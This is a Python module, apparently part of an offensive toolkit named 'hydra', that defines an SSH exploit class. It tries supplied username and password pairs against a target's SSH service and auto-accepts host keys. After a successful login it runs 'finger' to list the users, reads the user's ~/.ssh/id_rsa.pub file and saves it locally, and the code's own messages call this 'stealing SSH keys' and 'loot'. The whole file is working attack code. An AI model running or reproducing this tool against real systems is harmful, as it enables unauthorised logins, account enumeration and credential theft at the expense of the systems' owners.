from hydra import Exploit
from util import Color
import sys, paramiko

class SSH(Exploit):
    def __init__(self):
        self.name = 'ssh'
        self.port = 22
    
    def get_usernames(self, ssh):
        ssh.invoke_shell()
        stdin, stdout, stderr = ssh.exec_command('finger')
        stdin.close()
        stdout.readline()

        usernames = []
        for line in stdout:
            toks = line.split(' ')
            loot = (toks[0], None)
            if loot not in usernames:
                usernames.append(loot)
        return usernames
    
    def get_sshkeys(self, ssh, ip_address, username):
        try:
            stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
        except:
            print(f"{Color.BMAGEN}No SSH keys found.{Color.END}", file=self.output)
        else:
            keys_bytes = stdout.read()
            keys = keys_bytes.decode(encoding='UTF-8')
            with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                text_file.write(keys)
            print(f"{Color.BGRN}Success.{Color.END}{Color.BMAGEN} SSH keys saved in Data folder.{Color.END}", file=self.output)
        finally:
            stdin.close()

    def getloot(self, ip_address, credentials):
        # try to log into ssh using credentials
        users = []
        for c in credentials:
            print(f"{Color.BMAGEN}Trying to SSH into IP address {ip_address} with:{Color.END}\n Username: {c[0]} and Password: {c[1]}", file=self.output)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=c[0], password=c[1])
            except paramiko.AuthenticationException:
                print(f'{Color.BRED}Authentification failed.{Color.END}', file=self.output)
                ssh.close()
            else:
                print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
                users.append(self.get_usernames(ssh))
                
                print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
                self.get_sshkeys(ssh, ip_address, c[0])
        return users